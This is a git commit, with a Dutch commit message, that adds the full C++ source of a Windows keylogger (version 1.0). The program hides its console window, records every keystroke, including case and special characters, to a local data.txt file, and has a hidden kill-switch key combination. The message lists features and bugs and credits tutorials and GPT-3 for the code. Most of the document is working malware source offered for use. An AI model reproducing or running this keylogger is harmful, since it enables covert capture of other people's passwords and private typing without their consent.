a20ca4871cde87338358b86bb6fb60ada9c1dc2b
Balonserrr <94622356+Balonserrr@users.noreply.github.com>
2023-04-09 08:33:37 +0200

    keyloggerv1.0
    Versie 1.0 van keylogger, functies:
    - logt alle toetsen en output die naar data.txt
    - kan speciale tekens omzetten
    - differentieert tussen kleine- en hoofdletters
    - kill switch (SHIFT+CTRL+*)
    
    problemen:
    - verliest zijn shit als numpad wordt gebruikt zonder numlock
    - als numlock aanstaat dan kunnen nummers worden gelogd naar geen numlock zelf, /, *
    - f toetsen niet gelogd (maar dit maakt geen reet uit)
    
    bronnen:
    - https://emilien.ca/C++-Keylogger/ (en bronnen die in code staan) voor init
    - https://github.com/EgeBalci/Keylogger voor init
    - GPT-3 model voor refactoring/verkorting code
    - https://home.unicode.org/ voor unicode-8 symbolen

---
+++ keylogger.cpp
@@ -0,0 +1,101 @@
+#define _WIN32_WINNT 0x0500
+#include <Windows.h>
+#include <string>
+#include <iostream>
+#include <fstream>
+#include <map>
+
+using namespace std;
+
+// logt de input naar een file genaamd data.txt
+void LOG(string input) {
+    fstream LogFile("data.txt", fstream::app);
+    if (LogFile.is_open()) {
+        LogFile << input;
+        LogFile.close();
+    }
+}
+
+// voegt speciale toetsen toe aan een map
+bool SpecialKeys(int S_Key) {
+    static map<int, string> specialKeys = {
+        {VK_SPACE, " "},
+        {VK_RETURN, "\n"},
+        {VK_SHIFT, "⇧"},
+        {VK_BACK, "⌫"},
+        {VK_DELETE, "⌦"},
+        {VK_LBUTTON, "[L  ]"},
+        {VK_MBUTTON, "[ M ]"},
+        {VK_RBUTTON, "[  R]"},
+        {VK_CAPITAL, "⇪"},
+        {VK_ESCAPE, "☒"},
+        {91, "❖"},
+        {VK_TAB, "↹"},
+        {VK_UP, "↑"},
+        {VK_DOWN, "↓"},
+        {VK_LEFT, "←"},
+        {VK_RIGHT, "→"},
+        {VK_CONTROL, "⌃"},
+        {VK_MENU, "⎇"},
+        {VK_OEM_PLUS, "+"},
+        {VK_OEM_MINUS, "-"},
+        {VK_OEM_1, GetKeyState(VK_SHIFT) < 0 ? ":" : ";"},
+        {VK_OEM_2, GetKeyState(VK_SHIFT) < 0 ? "?" : "/"},
+        {VK_OEM_3, GetKeyState(VK_SHIFT) < 0 ? "~" : "`"},
+        {VK_OEM_4, GetKeyState(VK_SHIFT) < 0 ? "{" : "["},
+        {VK_OEM_5, GetKeyState(VK_SHIFT) < 0 ? "|" : "\\"},
+        {VK_OEM_6, GetKeyState(VK_SHIFT) < 0 ? "}" : "]"},
+        {VK_OEM_7, GetKeyState(VK_SHIFT) < 0 ? "\"" : "'"},
+        {VK_OEM_COMMA, GetKeyState(VK_SHIFT) < 0 ? "<" : ","},
+        {VK_OEM_PERIOD, GetKeyState(VK_SHIFT) < 0 ? ">" : "."}
+    };
+
+    // als de toets in de map zit dan logt hij de toets
+    if (specialKeys.find(S_Key) != specialKeys.end()) {
+        cout << specialKeys[S_Key];
+        LOG(specialKeys[S_Key]);
+        return true;
+    }
+    return false;
+}
+
+// als de toetsen ctrl, shift en * worden ingedrukt dan stopt de keylogger
+bool KillSwitch() {
+    return (GetAsyncKeyState(VK_SHIFT) < 0) &&
+           (GetAsyncKeyState(VK_CONTROL) < 0) &&
+           (GetAsyncKeyState(VK_MULTIPLY) < 0);
+}
+
+// main functie
+int main()
+{
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+    // zolang de keylogger niet wordt gestopt blijft hij lopen
+    while (true) {
+        Sleep(10);
+        // als de killswitch is geactiveerd dan logt ##KILLED##
+        if (KillSwitch()) {
+            LOG("##KILLED##");
+            break;
+        }
+        // voor elke toets wordt er gekeken of hij is ingedrukt
+        for (int KEY = 1; KEY <= 255; KEY++) {
+            if (GetAsyncKeyState(KEY) == -32767) {
+                if (!SpecialKeys(KEY)) {
+                    char logged_key = static_cast<char>(KEY);
+                    // numpad toetsen worden omgezet naar normale toetsen
+                    if (KEY >= VK_NUMPAD0 && KEY <= VK_NUMPAD9) {
+                        logged_key = '0' + (KEY - VK_NUMPAD0);
+                    // kijken of de toets een hoofdletter of kleine letter is (shift en capslock)
+                    } else if (isalpha(logged_key)) {
+                        logged_key = (GetKeyState(VK_SHIFT) < 0) ^ (GetKeyState(VK_CAPITAL) & 1) ? toupper(logged_key) : tolower(logged_key);
+                    }
+                    // logt de toets
+                    LOG(string(1, logged_key));
+                }
+            }
+        }
+    }
+
+    return 0;
+}
